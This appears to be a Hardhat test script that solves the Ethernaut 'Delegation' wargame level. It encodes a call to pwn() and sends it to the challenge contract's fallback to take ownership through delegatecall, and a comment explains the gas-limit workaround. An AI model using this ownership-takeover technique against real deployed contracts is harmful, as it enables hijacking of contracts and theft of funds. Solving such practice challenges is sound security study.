import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  const challengeAddress = await createChallenge(
    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const delegateeAbi = ["function pwn()"];
  let iface = new ethers.utils.Interface(delegateeAbi);
  const data = iface.encodeFunctionData(`pwn`, [])

  tx = await eoa.sendTransaction({
    from: await eoa.getAddress(),
    to: challenge.address,
    data,
    // estimating gas fails! because fallback does not revert when inner call fails
    // The catch about gas estimation is that the node will try out your tx
    // with different gas values, and return the lowest one for which your tx
    // doesn't fail. But it only looks at your tx, not at any of the internal call
    // it makes. This means that if the contract code you're calling has a
    // try/catch that causes it not to revert if an internal call does,
    // you can get a gas estimation that would be enough for the caller contract,
    // but not for the callee.
    // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
    gasLimit: BigNumber.from(`100000`),
  })

  // tx = await challenge.fallback({
  //   data,
  // })
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
